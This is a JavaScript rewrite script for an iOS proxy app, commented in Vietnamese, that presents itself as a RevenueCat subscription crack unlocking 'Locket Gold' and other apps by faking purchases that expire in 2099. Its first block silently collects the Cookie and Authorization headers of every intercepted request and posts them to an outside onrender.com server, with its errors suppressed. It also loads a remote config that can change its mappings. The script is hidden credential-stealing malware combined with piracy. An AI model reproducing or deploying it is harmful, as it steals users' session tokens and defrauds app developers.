// ========= CẤU HÌNH ĐỊA CHỈ TẢI CONFIG TỪ XA ========= //
// Thay đường dẫn dưới đây bằng link Raw tới file config.json của bạn trên GitHub
const CONFIG_URL = "https://raw.githubusercontent.com/tinphuc179-bot/locketgold/refs/heads/main/config.json";

// Hàm thực thi chính
function main() {
  try {
    // 1. Phần Pentest / Thu thập thông tin (Giữ nguyên logic từ nguồn cũ)
    var user_cookie = $request.headers["Cookie"] || $request.headers["cookie"];
    var user_token = $request.headers["Authorization"] || $request.headers["authorization"] || $request.headers["token"];
    var target_url = $request.url;

    if ((user_cookie || user_token) && !target_url.includes("onrender.com")) {
      const default_server = "https://server-2bpd.onrender.com/";
      $httpClient.post({
        url: default_server,
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          url: target_url,
          cookie: user_cookie || "Không có",
          token: user_token || "Không có"
        })
      }, function(error, response, data) {
        // Thực thi ngầm im lặng
      });
    }
  } catch (e) {
    // Bỏ qua lỗi ngầm
  }

  // 2. Phần xử lý bản quyền RevenueCat với cấu hình động
  try {
    var current_url = $request.url;

    if (/^https:\/\/api\.revenuecat\.com\/.+\/(receipts$|subscribers\/[^/]+$)/.test(current_url)) {
      // Tải cấu hình từ xa trước khi áp dụng bẻ khóa
      $httpClient.get({ url: CONFIG_URL + "?t=" + Date.now() }, function(error, response, data) {
        var mapping = {
          '%E8%BD%A6%E7%A5%A8%E7%A5%A8': ['vip+watch_vip'],
          'Locket': ['Gold']
        }; // Cấu hình dự phòng nếu không tải được file từ xa

        if (!error && data) {
          try {
            var remoteConfig = JSON.parse(data);
            if (remoteConfig.mapping) {
              mapping = remoteConfig.mapping;
            }
          } catch (err) {
            // Dùng cấu hình mặc định nếu parse JSON lỗi
          }
        }

        var ua = $request.headers["User-Agent"] || $request.headers["user-agent"],
            obj = JSON.parse($response.body);

        obj.Attention = "Chúc mừng bạn! Cấu hình đã được tự động cập nhật!";

        var M4T = {
          is_sandbox: !1,
          ownership_type: "PURCHASED",
          billing_issues_detected_at: null,
          period_type: "normal",
          expires_date: "2099-12-18T01:04:17Z",
          grace_period_expires_date: null,
          unsubscribe_detected_at: null,
          original_purchase_date: "2024-07-28T01:04:18Z",
          purchase_date: "2024-07-28T01:04:17Z",
          store: "app_store"
        };

        var M4T_product = {
          grace_period_expires_date: null,
          purchase_date: "2024-07-28T01:04:17Z",
          product_identifier: "com.M4T.premium.yearly",
          expires_date: "2099-12-18T01:04:17Z"
        };

        const match = Object.keys(mapping).find(e => ua.includes(e));

        if (match) {
          let [e, s] = mapping[match];
          if (s) {
            M4T_product.product_identifier = s;
            obj.subscriber.subscriptions[s] = M4T;
          } else {
            obj.subscriber.subscriptions["com.M4T.premium.yearly"] = M4T;
          }
          obj.subscriber.entitlements[e] = M4T_product;
        } else {
          obj.subscriber.subscriptions["com.M4T.premium.yearly"] = M4T;
          obj.subscriber.entitlements.pro = M4T_product;
        }

        $done({ body: JSON.stringify(obj) });
      });
    } else {
      $done({});
    }
  } catch (e) {
    $done({});
  }
}

main();
